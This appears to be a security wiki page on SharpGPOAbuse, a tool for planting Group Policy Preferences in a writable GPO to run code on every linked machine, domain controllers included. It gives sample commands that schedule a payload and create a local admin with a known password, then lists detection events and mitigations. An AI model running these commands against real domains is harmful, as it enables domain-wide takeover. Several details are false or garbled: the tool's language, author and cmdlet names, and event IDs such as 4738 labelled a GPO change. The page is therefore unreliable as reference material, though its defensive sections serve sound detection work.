---
title: SharpGPOAbuse
type: entity
created: 2026-09-06
updated: 2026-09-06
tags: [tool, gpo, powershell, active-directory, code-execution]
---

# SharpGPOAbuse

**SharpGPOAbuse** (by williamla1337, part of PowerSploit) is the PowerShell
**GPO-abuse** tool — it writes malicious **Group Policy Preferences** (scheduled
task, local user, INI file, startup script, etc.) into a GPO you have
edit-rights on, so the payload runs on every machine the GPO is **linked to**
(including DCs). It's the "code exec via GPO" tool for the [[gpo-abuse]]
family — the attack path from a writable GPO to domain-wide (and DC) code
execution. See [[gpo-abuse]] for the mechanics and
[[path-gpo-write-to-domain-admin]] for the full chain.

## The abuse

1. You hold **edit-rights** (WriteDacl / GenericWrite / owner) on a GPO
   object — the [[gpo-abuse]] / [[acl-abuse]] edge.
2. SharpGPOAbuse injects a GPP object (e.g. a **Scheduled Task** GPP that runs
   your payload, or a **Local User** GPP with a known password, or a
   **Startup/Shutdown script**).
3. Every machine the GPO is **linked to** applies it at next policy refresh —
   if that includes a **DC**, you have **Tier-0 code execution**.

## Common invocations

```powershell
Import-Module .\SharpGPOAbuse.ps1

# Inject a Scheduled Task GPP into a writable GPO (runs payload on linked machines)
Invoke-GPOScheduledTask -TaskName "WinSAT" -TaskCommand "cmd.exe" `
  -TaskArguments "/c C:\temp\payload.exe" -GUID <gpo-guid>

# Inject a Local User GPP (creates a local admin with a known password)
Invoke-GPOLocalUser -UserName "svc_backup" -Password "P@ssw0rd" -GUID <gpo-guid>

# Remove the object after use (cleanup)
Remove-GPOScheduledTask -TaskName "WinSAT" -GUID <gpo-guid>
```

## Detection

- **4738 / GPO change** — a new GPP object (scheduled task / local user /
  script) written to a GPO (Event 5136 on the GPO object, or the GPP XML
  change in the SYSVOL).
- **SYSVOL change** — a new `.xml` GPP object under `Policies\<guid>\` in the
  SYSVOL share.
- **The payload execution** — 4688 for the scheduled task / script on linked
  machines (especially DCs).
- **Local user GPP** — a new local admin on many machines (4720 / 4726).

## Mitigations

- **Restrict GPO edit-rights** — only Tier-0 principals should write GPOs
  ([[gpo-abuse]], [[acl-abuse]]).
- **Alert on GPP object creation** in a GPO, especially one linked to DCs.
- **Monitor SYSVOL** for new GPP XML.
- **Tiering** — the structural fix; a writable GPO linked to a DC is a
  Tier-0 edge.

## Links

- [[gpo-abuse]] — the GPO-abuse concept this tool implements
- [[path-gpo-write-to-domain-admin]] — the full writable-GPO → DA chain
- [[acl-abuse]] — the GPO object-control edge
- [[gpohound]] — the GPO enumeration tool (find the writable GPOs)
- [[ad-persistence]] — GPO-based persistence
- [[bloodhound]] — how you find the GPO write edge

## References

- [SharpGPOAbuse (GitHub)](https://github.com/PowerSploit/PowerSploit)
- [ired.team: GPO abuse](https://www.ired.team/windows-offensive-security/group-policies)
- [gpo-abuse (this wiki)](gpo-abuse)
